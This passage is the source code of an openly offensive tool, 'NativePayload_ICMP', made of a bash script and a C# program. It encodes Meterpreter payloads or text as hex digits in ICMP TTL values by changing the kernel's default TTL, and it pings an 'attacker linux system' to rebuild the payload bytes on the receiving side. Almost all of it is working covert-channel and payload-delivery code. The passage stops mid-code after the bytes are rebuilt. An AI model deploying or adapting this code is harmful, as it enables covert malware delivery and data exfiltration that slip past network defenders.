\"[&gt;] Start Flag , change TTL value to \'254\' with sleep 5)\";\n\r\n\r        sudo sysctl net.ipv4.ip_default_ttl=254; sleep 5;\n\r\n\r        echo \"[&gt;] Running sysctl command for change TTL values (Default sleep is 2)\";\n\r\n\r        echo        \n\r\n\r        \n\r\n\r                for TTLs in `echo $Finalttlpayload | xxd -p -c 3`\n\r\n\r                do\n\r\n\r                string=`echo $TTLs | xxd -r -p`\n\r\n\r                        if [ \"$string\" != $\'\' ] &amp;&amp; [ \"$string\" != $\'.\' ];\n\r\n\r                        then \n\r\n\r                        echo \"sudo sysctl net.ipv4.ip_default_ttl=\"$string \"; sleep 2\";\n\r\n\r                        sudo sysctl net.ipv4.ip_default_ttl=$string; sleep 2;\n\r\n\r                        fi\n\r\n\r                done\n\r\n\r                sudo sysctl net.ipv4.ip_default_ttl=255; sleep 2;\n\r\n\r                sudo sysctl net.ipv4.ip_default_ttl=100; sleep 2;\n\r\n\r                sudo sysctl net.ipv4.ip_default_ttl=255; sleep 2;\n\r\n\r        fi\n\r\n\rif [ \"$1\" == $\'listen\' ] ;\n\r\n\r        then\n\r\n\rwhile (true)\n\r\n\rdo\n\r\n\r        Time=`date \'+%d/%m/%Y %H:%M:%S\'`\n\r\n\r        ((PingRequest++));\n\r\n\r \n\r\n\r        string=`ping $2 -c 1 | grep -e ttl= | awk {\'print $6\'}`         \n\r\n\r        echo\n\r\n\r        string=`echo $string | cut -d\'=\' -f2`         \n\r\n\r       \n\r\n\r        case $string in \n\r\n\r        100)\n\r\n\r tput setaf 2; \n\r\n\r        echo \"[$Time]\" \"Dumped Byte via TTL : 0\"\n\r\n\r        if (( $temp != 100 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"0\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        101)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 1\"\n\r\n\r        if (( $temp != 101 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"1\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        102)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 2\"\n\r\n\r        if (( $temp != 102 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"2\"\n\r\n\r        fi        \n\r\n\r        ;;\n\r\n\r        103)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 3\"\n\r\n\r        if (( $temp != 103 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"3\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        104)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 4\"\n\r\n\r        if (( $temp != 104 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"4\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        105)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 5\"\n\r\n\r        if (( $temp != 105 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"5\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        106)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 6\"\n\r\n\r        if (( $temp != 106 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"6\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        107)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 7\"\n\r\n\r        if (( $temp != 107 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"7\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        108)\n\r\n\r tput setaf 2;        \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 8\"\n\r\n\r        if (( $temp != 108 )) ;\n\r\n\r        then\n\r\n\r        payload+=\"8\"\n\r\n\r        fi        \n\r\n\r        ;;\n\r\n\r        109)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : 9\"\n\r\n\r        if (( $temp != 109 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"9\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        110)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : a\"\n\r\n\r        if (( $temp != 110 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"a\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        111)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : b\"\n\r\n\r        if (( $temp != 111 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"b\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        112)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : c\"\n\r\n\r        if (( $temp != 112 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"c\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        113)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : d\"\n\r\n\r        if (( $temp != 113 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"d\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        114)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : e\"\n\r\n\r        if (( $temp != 114 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"e\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        115)\n\r\n\r tput setaf 2; \n\r\n\r       echo \"[$Time]\" \"Dumped Byte via TTL : f\"\n\r\n\r        if (( $temp != 115 ))  ;\n\r\n\r        then\n\r\n\r        payload+=\"f\"\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        255)\n\r\n\r        tput setaf 1; \n\r\n\r        echo \"[$Time] ,\" $c \":Dumped Finish Flag \'ttl 255\' \"        \n\r\n\r \n\r\n\r        ((c++));\n\r\n\r \n\r\n\r        if (( $c == 15 )) ;\n\r\n\r        then\n\r\n\r        break\n\r\n\r        fi\n\r\n\r        ;;\n\r\n\r        253)\n\r\n\r        tput setaf 3; \n\r\n\r        echo \"[$Time] ,\" $c \":Dumped Double Flag \'ttl 253\' \"        \n\r\n\r        ;;\n\r\n\r        esac\n\r\n\r        \n\r\n\r        temp=$string;\n\r\n\r \n\r\n\r tput setaf 9;\n\r\n\r       echo \"Ping Requests:\" $PingRequest \n\r\n\r       echo \"your Payload :\"  $payload \n\r\n\r tput setaf 9; \n\r\n\r \n\r\n\r#final=`echo $payload | xxd -r -p`\n\r\n\r \n\r\n\r        final=`echo -n $payload | od -A n -t x1 | xxd -r -p | xxd -r -p`\n\r\n\r        echo \"your Data : \" $final\n\r\n\r        \n\r\n\rsleep 1;\n\r\n\rdone\n\r\n\r        fi\n\r\n\r \n\r\n\r \n\r\n\rC# code : NativePayload_ICMP.cs (version 2.0).\n\r\n\r \n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Text;\n\r\n\rusing System.Diagnostics;\n\r\n\rusing System.Data;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\r \n\r\n\rnamespace NativePayload_ICMP\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        static string payload = \"\";\n\r\n\r        public static DataTable Hex_Dec_Table;\n\r\n\r        static string help = \"\\n\" + \"NativePayload_ICMP syntax :\" + \"\\n\\n\"\n\r\n\r          + \"Syntax 1-1 : NativePayload_ICMP sh \\\"ffccab1cd01f0400 ....\\\" Input your meterpreter payload for create sh file\" + \"\\n\"\n\r\n\r            + \"Syntax 1-2 : NativePayload_ICMP session \\\"www.xxx.yyy.zzz\\\" Target system IPv4 Address for Send Ping Request .... Getting Meterpreter Session with Ping via TTL Values\" + \"\\n\"\n\r\n\r            + \"Syntax 2-1 : NativePayload_ICMP shtext \\\"your unicode text....\\\" Input your DATA/TEXT payload for create sh Script file\" + \"\\n\"\n\r\n\r            + \"Syntax 2-2 : NativePayload_ICMP listen \\\"www.xxx.yyy.zzz\\\" Target system IPv4 Address for Send Ping Request .... Dumping DATA/TEXT payload via TTL Values\" + \"\\n\"            \n\r\n\r            + \"Syntax 3 : NativePayload_ICMP help\" + \"\\n\\n\";\n\r\n\r \n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            try\n\r\n\r            {\n\r\n\r                Hex_Dec_Table = new DataTable();\n\r\n\r \n\r\n\r                Hex_Dec_Table.Columns.Add(\"Dec\", typeof(int));\n\r\n\r                Hex_Dec_Table.Columns.Add(\"Hex\", typeof(string));\n\r\n\r \n\r\n\r                for (int i = 0; i &lt;= 15; i++)\n\r\n\r                {\n\r\n\r                    if (i &lt;= 9)\n\r\n\r                    {\n\r\n\r                        Hex_Dec_Table.Rows.Add(i, i.ToString());\n\r\n\r                    }\n\r\n\r                    else if (i &gt;= 10)\n\r\n\r                    {\n\r\n\r                        switch (i)\n\r\n\r                        {\n\r\n\r                            case 10:\n\r\n\r                                {\n\r\n\r                                    Hex_Dec_Table.Rows.Add(i, \"a\");\n\r\n\r                                }\n\r\n\r                                break;\n\r\n\r                            case 11:\n\r\n\r                                {\n\r\n\r                                    Hex_Dec_Table.Rows.Add(i, \"b\");\n\r\n\r                                }\n\r\n\r                                break;\n\r\n\r                            case 12:\n\r\n\r                                {\n\r\n\r                                    Hex_Dec_Table.Rows.Add(i, \"c\");\n\r\n\r                                }\n\r\n\r                                break;\n\r\n\r                            case 13:\n\r\n\r                                {\n\r\n\r                                    Hex_Dec_Table.Rows.Add(i, \"d\");\n\r\n\r                                }\n\r\n\r                                break;\n\r\n\r                            case 14:\n\r\n\r                                {\n\r\n\r                                    Hex_Dec_Table.Rows.Add(i, \"e\");\n\r\n\r                                }\n\r\n\r                                break;\n\r\n\r                            case 15:\n\r\n\r                                {\n\r\n\r                                    Hex_Dec_Table.Rows.Add(i, \"f\");\n\r\n\r                                }\n\r\n\r                                break;\n\r\n\r                                // default:\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                }\n\r\n\r                if (args[0].ToUpper() == \"HELP\")\n\r\n\r                {\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                    Console.WriteLine(\"NativePaylaod_ICMPv4 v2.0 , Published by Damon Mohammadbagher , 2017-2018\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine(\"Using ICMPv4 (ping) to Dump Payloads by TTL response ;)\");\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.WriteLine(help);\n\r\n\r                }           \n\r\n\r                else if (args[0].ToUpper() == \"SH\" || args[0].ToUpper() == \"SHTEXT\")\n\r\n\r                {\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                    Console.WriteLine(\"NativePaylaod_ICMPv4 v2.0 , Published by Damon Mohammadbagher , 2017-2018\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine(\"Using ICMPv4 (ping) to Dump Payloads by TTL response ;)\");\n\r\n\r                    Console.WriteLine();\n\r\n\r                    if (args.Length == 2)\n\r\n\r                    {\n\r\n\r                        if (args[0].ToUpper() == \"SH\")\n\r\n\r                        {\n\r\n\r                            payload = args[1];\n\r\n\r                        }\n\r\n\r                        if(args[0].ToUpper() == \"SHTEXT\")\n\r\n\r                        {\n\r\n\r                            try\n\r\n\r                            {                               \n\r\n\r                                byte[] Xbytes = UnicodeEncoding.UTF8.GetBytes(args[1]);                               \n\r\n\r                                foreach (var item in Xbytes)\n\r\n\r                                {\n\r\n\r                                    payload += item.ToString(\"x2\");\n\r\n\r                                }                                \n\r\n\r                            }\n\r\n\r                            catch (Exception e)\n\r\n\r                            {\n\r\n\r                                Console.Write(e.Message);\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    string ff = \"\";\n\r\n\r                    string lastone = \"\";\n\r\n\r                    string TempPayload = \"\";\n\r\n\r                    for (int i = 0; i &lt; payload.Length;)\n\r\n\r                    {\n\r\n\r                        if (i != payload.Length)\n\r\n\r                        {\n\r\n\r                            ff = payload.Substring(i, 1);\n\r\n\r                            string ss = _HextoDecimal(ff);\n\r\n\r                            // debug only\n\r\n\r                            //Console.WriteLine(ff + \"  \" + ss);\n\r\n\r                            ///Console.Write(\"\\n sudo sysctl net.ipv4.ip_default_ttl=\" + ss + \" ; \" + \"sleep 1 ;\");\n\r\n\r                            if (lastone != ss)\n\r\n\r                            {\n\r\n\r                                lastone = ss;\n\r\n\r                                //Console.Write(\"\\n sudo sysctl net.ipv4.ip_default_ttl=\" + ss + \" ; \" + \"sleep 2 ; \\n\");\n\r\n\r                                TempPayload += ss.Substring(0, ss.Length - 1);\n\r\n\r                            }\n\r\n\r                            else\n\r\n\r                            {\n\r\n\r                                //Console.Write(\"\\n sudo sysctl net.ipv4.ip_default_ttl=\" + \"255\" + \" ; \" + \"sleep 1 ; \\n\");\n\r\n\r                                //Console.Write(\"\\n sudo sysctl net.ipv4.ip_default_ttl=\" + ss + \" ; \" + \"sleep 2 ; \\n\");\n\r\n\r                                TempPayload += \"255\" + ss.Substring(0, ss.Length - 1);\n\r\n\r                            }\n\r\n\r                            //Console.Write(\"\\n sudo sysctl net.ipv4.ip_default_ttl=\" + \"255\" + \" ; \" + \"sleep 1 ; \\n\");\n\r\n\r                            //Console.WriteLine();\n\r\n\r                            i++;\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r \n\r\n\r                    StringBuilder Mycode = new StringBuilder();\n\r\n\r                    Mycode.AppendLine(\" #!/bin/sh \\n\");\n\r\n\r                    Mycode.AppendLine(\"sudo sysctl net.ipv4.ip_default_ttl=254;\\r\");\n\r\n\r                    Mycode.AppendLine(\"sleep 5;\");\n\r\n\r                    Mycode.AppendLine(\"TtlPayload=\\\"\" + TempPayload + \"\\\";\");\n\r\n\r                    Mycode.AppendLine(\"                    for pay in `echo $TtlPayload | xxd -p -c 3`\");\n\r\n\r                    Mycode.AppendLine(\"                              do \");\n\r\n\r                    Mycode.AppendLine(\"                                 str=`echo $pay | xxd -r -p`\");\n\r\n\r                    Mycode.AppendLine(\"                                 if [ \\\"$str\\\" != $\'\' ];\");\n\r\n\r                    Mycode.AppendLine(\"                                 then \");\n\r\n\r                    Mycode.AppendLine(\"                                 echo \\\"sudo sysctl net.ipv4.ip_default_ttl=\\\"$str \\\"; sleep 2;\\\"\");\n\r\n\r                    Mycode.AppendLine(\"                                 sudo sysctl net.ipv4.ip_default_ttl=$str; sleep 2;\");\n\r\n\r                    Mycode.AppendLine(\"                                 fi\");\n\r\n\r                    Mycode.AppendLine(\"                              done\");\n\r\n\r                    if (args[0].ToUpper() == \"SHTEXT\")\n\r\n\r                    {\n\r\n\r                        for (int i = 0; i &lt; 5 - args[1].Length % 5; i++)\n\r\n\r                        {\n\r\n\r                            if (args[1].Length % 5 == 0) break;\n\r\n\r                            Mycode.AppendLine(\"sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;\");\n\r\n\r                            Mycode.AppendLine(\"sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;\");\n\r\n\r                            Mycode.AppendLine(\"sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;\");\n\r\n\r                            Mycode.AppendLine(\"sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;\");\n\r\n\r                        }\n\r\n\r \n\r\n\r                        Mycode.AppendLine(\"sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;\");\n\r\n\r                        Mycode.AppendLine(\"sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;\");\n\r\n\r                    }\n\r\n\r \n\r\n\r                    Mycode.AppendLine(\"sudo sysctl net.ipv4.ip_default_ttl=255;\");\n\r\n\r                    Mycode.AppendLine(\"echo \\\"Done.\\\";\");                    \n\r\n\r                   \n\r\n\r                    Console.WriteLine(\"\\n[!] File script.sh Created : \\n\");\n\r\n\r                    Console.WriteLine(Mycode.ToString());\n\r\n\r                    try\n\r\n\r                    {\n\r\n\r                        using (System.IO.FileStream Fs = new System.IO.FileStream(\"script.sh\", System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n\r\n\r                        {\n\r\n\r                            using (System.IO.StreamWriter sw = new System.IO.StreamWriter(Fs))\n\r\n\r                            {\n\r\n\r                                sw.WriteLine(Mycode.ToString().Replace(\"\\r\", string.Empty));\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    catch (Exception omg)\n\r\n\r                    {\n\r\n\r                        Console.WriteLine(omg.Message);\n\r\n\r                    }\n\r\n\r                }\n\r\n\r                else if (args[0].ToUpper() == \"LISTEN\")\n\r\n\r                {\n\r\n\r                    bool flag_end = false;\n\r\n\r                    bool init = false;\n\r\n\r                    int flag_end_count = 0;\n\r\n\r                    int Payload_counter = 0;\n\r\n\r                    string temp = \"\";\n\r\n\r                    string start_time, end_time = \"\";\n\r\n\r                    start_time = DateTime.Now.ToString();\n\r\n\r                    string Oonaggi = \"\";\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                    Console.WriteLine(\"NativePaylaod_ICMPv4 v2.0 , Published by Damon Mohammadbagher , 2017-2018\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;                   \n\r\n\r                    Console.WriteLine(\"Using ICMPv4 (ping) to Dump Payloads by TTL response ;)\");\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                    Console.WriteLine(\"[!] Listening Mode\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    bool isDublicate = false;\n\r\n\r                    string Last_ttl_str = \"\";\n\r\n\r                    string TestStr = \"\";\n\r\n\r                    int Timer_Time_Show_Bytes = 0;\n\r\n\r                    int two = 0;\n\r\n\r                    string String_two_Bytes = \"\";\n\r\n\r                    byte[] String_from_Bytes = new byte[5];\n\r\n\r                    Console.WriteLine(\"{0} Dumping These Bytes: \", DateTime.Now.ToString());\n\r\n\r                    String_two_Bytes = \"\";\n\r\n\r                    while (true)\n\r\n\r                    {\n\r\n\r                        if (flag_end) break;\n\r\n\r                        //// ping and send ICMP Traffic to attacker linux system to Dump payloads via TTL response ;)\n\r\n\r                        string getcode = _Ping(args[1], 1);\n\r\n\r                        try\n\r\n\r                        {\n\r\n\r                            getcode = getcode.Remove(getcode.Length - 1, 1);\n\r\n\r                        }\n\r\n\r                        catch (Exception e1)\n\r\n\r                        {\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                            Console.WriteLine(\"e1 : \" + e1.Message);\n\r\n\r                            Console.WriteLine();\n\r\n\r                            Console.WriteLine(\"Error : it is not good  ;( \");\n\r\n\r                            Console.WriteLine(\"Please run this tool again\");\n\r\n\r                            Console.WriteLine(\"after running this tool Please again run your ./script.sh in linux ;)\");\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                            break;\n\r\n\r                        }\n\r\n\r \n\r\n\r                        if (getcode == \"254\") { init = true; }\n\r\n\r                        if (getcode == \"255\")\n\r\n\r                        {\n\r\n\r                            isDublicate = true;\n\r\n\r                            Last_ttl_str = getcode;\n\r\n\r                        }\n\r\n\r                        if (getcode != \"255\")\n\r\n\r                        {\n\r\n\r                            Last_ttl_str = getcode;\n\r\n\r                            flag_end_count = 0;\n\r\n\r                          \n\r\n\r                            if (getcode != temp &amp;&amp; getcode != \"255\" &amp;&amp; getcode != \"253\")\n\r\n\r                            {\n\r\n\r                                if (init &amp;&amp; getcode != \"254\")\n\r\n\r                                {\n\r\n\r                                    if (Timer_Time_Show_Bytes == 10)\n\r\n\r                                    {\n\r\n\r                                        Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                                        int kk = 0;\n\r\n\r                                        for (int i = 0; i &lt; 5;)\n\r\n\r                                        {\n\r\n\r                                            String_from_Bytes[i] = byte.Parse(String_two_Bytes.Substring(kk, 2), System.Globalization.NumberStyles.HexNumber);\n\r\n\r                                            kk++;\n\r\n\r                                            kk++;\n\r\n\r                                            i++;\n\r\n\r                                        }\n\r\n\r \n\r\n\r                                        Console.Write(\"  ==&gt; \" + UTF8Encoding.ASCII.GetString(String_from_Bytes));\n\r\n\r                                        Timer_Time_Show_Bytes = 0;\n\r\n\r                                        String_two_Bytes = \"\";\n\r\n\r                                        Console.WriteLine();\n\r\n\r                                    }\n\r\n\r                                    \n\r\n\r                                    Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                                    TestStr = getcode.Substring(getcode.Length - 2, 2);\n\r\n\r                                    string Text = \"\";\n\r\n\r                                    for (int j = 0; j &lt;= 15; j++)\n\r\n\r                                    {\n\r\n\r                                        if (Convert.ToInt32(Hex_Dec_Table.Rows[j].ItemArray[0]) == Convert.ToInt32(TestStr))\n\r\n\r                                        {\n\r\n\r                                    \n\r\n\r                                            Text = (Hex_Dec_Table.Rows[j].ItemArray[1].ToString());\n\r\n\r                                            break;\n\r\n\r                                        }\n\r\n\r                                    }\n\r\n\r                                    \n\r\n\r                                    Console.Write(\"{0}\", Text);\n\r\n\r                                    String_two_Bytes += Text;\n\r\n\r                                    \n\r\n\r                                    Payload_counter++;\n\r\n\r                                    Timer_Time_Show_Bytes++;\n\r\n\r                                    two++;                                                                                                                                                                                   \n\r\n\r                                }\n\r\n\r                                else if (init == false)\n\r\n\r                                {\n\r\n\r                                    //  Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                                   // Console.WriteLine(\"{0} , {1} Find DATA from {2} final: {3}\", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);\n\r\n\r                                }\n\r\n\r                            }\n\r\n\r                            else if (getcode == temp &amp;&amp; getcode != \"255\")\n\r\n\r                            {\n\r\n\r                              //  Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                             //   Console.WriteLine(\"{0} , {1} Find DATA from {2} final: {3}\", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);\n\r\n\r                            }\n\r\n\r \n\r\n\r                            System.Threading.Thread.Sleep(1000);\n\r\n\r                            temp = getcode;\n\r\n\r                        }\n\r\n\r                        else if (getcode == \"255\")\n\r\n\r                        {\n\r\n\r                            flag_end_count++;\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                            // Console.WriteLine(\"{0} , {1} Find DATA from {2} final: {3}\", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);\n\r\n\r \n\r\n\r                            System.Threading.Thread.Sleep(500);\n\r\n\r                            temp = getcode;\n\r\n\r                            if (flag_end_count &gt;= 10)\n\r\n\r                            {\n\r\n\r                                flag_end = true;\n\r\n\r                                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                                Console.WriteLine();\n\r\n\r                                Console.WriteLine(\"{0} Dumping Payloads Done.\",DateTime.Now.ToString());\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                }\n\r\n\r                else if (args[0].ToUpper() == \"SESSION\")\n\r\n\r                {\n\r\n\r                    bool flag_end = false;\n\r\n\r                    bool init = false;\n\r\n\r                    int flag_end_count = 0;\n\r\n\r                    int Payload_counter = 0;\n\r\n\r                    string temp = \"\";\n\r\n\r                    string start_time, end_time = \"\";\n\r\n\r                    start_time = DateTime.Now.ToString();\n\r\n\r                    string Oonaggi = \"\";                          \n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                    Console.WriteLine(\"NativePaylaod_ICMPv4 v2.0 , Published by Damon Mohammadbagher , 2017-2018\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine(\"Using ICMPv4 (ping) to Dump Payloads by TTL response ;)\");\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                    Console.WriteLine(\"[!] Meterpreter Session Mode\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    bool isDublicate = false;\n\r\n\r                    string Last_ttl_str = \"\";\n\r\n\r                    while (true)\n\r\n\r                    {\n\r\n\r                        if (flag_end) break;\n\r\n\r                        //// ping and sending ICMP Traffic to attacker linux system to Dump payloads by TTL response ;)\n\r\n\r                        string getcode = _Ping(args[1], 1);\n\r\n\r                        try\n\r\n\r                        {\n\r\n\r                            getcode = getcode.Remove(getcode.Length - 1, 1);\n\r\n\r                        }\n\r\n\r                        catch (Exception e1)\n\r\n\r                        {\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                            Console.WriteLine(\"e1 : \" + e1.Message);\n\r\n\r                            Console.WriteLine();\n\r\n\r                            Console.WriteLine(\"Error : it is not good  ;( \");\n\r\n\r                            Console.WriteLine(\"Please run this tool again\");\n\r\n\r                            Console.WriteLine(\"after running this tool Please again run your ./script.sh in linux ;)\");\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                            break;\n\r\n\r                        }\n\r\n\r \n\r\n\r                        if (getcode == \"254\") { init = true; }\n\r\n\r                        if (getcode == \"255\")\n\r\n\r                        {\n\r\n\r                            isDublicate = true;\n\r\n\r                            Last_ttl_str = getcode;\n\r\n\r                        }\n\r\n\r                        if (getcode != \"255\")\n\r\n\r                        {\n\r\n\r                            Last_ttl_str = getcode;\n\r\n\r                            flag_end_count = 0;\n\r\n\r                            if (getcode != temp &amp;&amp; getcode != \"255\" &amp;&amp; getcode != \"253\")\n\r\n\r                            {\n\r\n\r                                if (init &amp;&amp; getcode != \"254\")\n\r\n\r                                {\n\r\n\r                                    Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                                    Console.Write(\"{0} , Dump:{1},\", DateTime.Now.ToString(), Payload_counter.ToString());\n\r\n\r                                    Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                                    //string dd = _HextoDecimal(getcode.Substring(1, 2));\n\r\n\r                                    Console.Write(\" DATA[{0}] \", getcode.Substring(getcode.Length - 2, 2));\n\r\n\r                                    Oonaggi += getcode.Substring(getcode.Length - 2, 2);\n\r\n\r                                    Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                                    Console.WriteLine(\"from {0} final: {1}\", args[1], getcode);\n\r\n\r                                    Payload_counter++;\n\r\n\r                                }\n\r\n\r                                else if (init == false)\n\r\n\r                                {\n\r\n\r                                    Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                                    Console.WriteLine(\"{0} , {1} Find DATA from {2} final: {3}\", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);\n\r\n\r                                }\n\r\n\r                            }\n\r\n\r                            else if (getcode == temp &amp;&amp; getcode != \"255\")\n\r\n\r                            {\n\r\n\r                                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                                Console.WriteLine(\"{0} , {1} Find DATA from {2} final: {3}\", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);\n\r\n\r                            }\n\r\n\r \n\r\n\r                            System.Threading.Thread.Sleep(1000);\n\r\n\r                            temp = getcode;\n\r\n\r                        }\n\r\n\r                        else if (getcode == \"255\")\n\r\n\r                        {\n\r\n\r                            flag_end_count++;\n\r\n\r                            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                            Console.WriteLine(\"{0} , {1} Find DATA from {2} final: {3}\", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);\n\r\n\r \n\r\n\r                            System.Threading.Thread.Sleep(500);\n\r\n\r                            temp = getcode;\n\r\n\r                            if (flag_end_count &gt;= 10) { flag_end = true; }\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r \n\r\n\r                    end_time = DateTime.Now.ToString();\n\r\n\r \n\r\n\r                    Console.WriteLine(end_time + \" , Done \");\n\r\n\r \n\r\n\r                    byte[] __Bytes = new byte[Oonaggi.Length / 4];\n\r\n\r                    int payload_dec_count = Oonaggi.Length / 4;\n\r\n\r                    int tmp_counter = 0;\n\r\n\r                    string current = null;\n\r\n\r                    int _0_to_2_ = 0;\n\r\n\r                    for (int d = 0; d &lt; payload_dec_count;)\n\r\n\r                    {\n\r\n\r                        string tmp1_current = (Oonaggi.Substring(tmp_counter, 2));\n\r\n\r \n\r\n\r                        for (int j = 0; j &lt;= 15; j++)\n\r\n\r                        {\n\r\n\r                            if (Convert.ToInt32(Hex_Dec_Table.Rows[j].ItemArray[0]) == Convert.ToInt32(tmp1_current))\n\r\n\r                            {\n\r\n\r                                _0_to_2_++;\n\r\n\r \n\r\n\r                                current += (Hex_Dec_Table.Rows[j].ItemArray[1].ToString());\n\r\n\r \n\r\n\r                                if (_0_to_2_ == 2)\n\r\n\r                                {\n\r\n\r                                    Console.Write(current + \" \");\n\r\n\r                                    __Bytes[d] = Convert.ToByte(current, 16);\n\r\n\r                                    _0_to_2_ = 0;\n\r\n\r                                    d++;\n\r\n\r                                    current = null;\n\r\n\r                                }\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r \n\r\n\r                        tmp_counter++;\n\r\n\r                        tmp_counter++;\n\r\n\r \n\r\n\r                    }\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    